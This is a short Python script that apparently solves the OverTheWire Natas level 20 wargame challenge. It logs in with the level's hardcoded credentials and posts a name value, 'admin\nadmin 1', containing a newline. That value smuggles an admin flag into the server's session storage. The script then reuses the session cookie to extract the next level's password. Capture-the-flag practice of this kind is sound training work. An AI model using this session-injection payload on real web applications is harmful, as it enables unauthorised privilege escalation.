import requests
import re

username = "natas20"
password = "guVaZ3ET35LbgbFMoaN5tFcYT1jEP7UH"

url = "http://%s.natas.labs.overthewire.org?debug=true"%username
session = requests.Session()


response1 = session.post(url ,data={"name" : "admin\nadmin 1"}, auth=(username,password))
phpsessid = response1.cookies['PHPSESSID']
content1 = response1.text

response2 = requests.get(url,auth=(username,password), cookies={"PHPSESSID" : phpsessid})
content = response2.text

flag = re.findall("Username: natas21\nPassword: (.*)</pre>",content)[0]

print("[+] Gotcha" , flag)